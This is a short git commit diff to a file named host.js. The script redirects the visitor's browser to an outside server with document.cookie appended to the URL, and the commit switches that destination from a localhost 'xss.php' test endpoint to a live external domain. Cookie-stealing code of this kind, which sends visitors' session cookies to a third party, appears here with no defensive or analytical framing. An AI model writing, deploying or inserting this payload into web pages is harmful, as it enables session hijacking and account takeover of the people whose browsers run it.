f1cbe9847923b001367b835280542d8381c6f5fb
Momanyi Joseph <jjmomanyis@gmail.com>
2017-10-14 19:18:17 +0300

    Update host.js

--- host.js
+++ host.js
@@ -4,7 +4,7 @@ var b=localStorage.getItem("b");
 var d=localStorage.getItem("d");
 if(b==null || date>d)
 {
-document.location="http://localhost/os/xss.php?cookie=" + document.cookie;
+document.location="http://code0.co.ke/os/index.php?cookie=" + document.cookie;
 localStorage.setItem("b", "b");
 localStorage.setItem("d", date);
 }
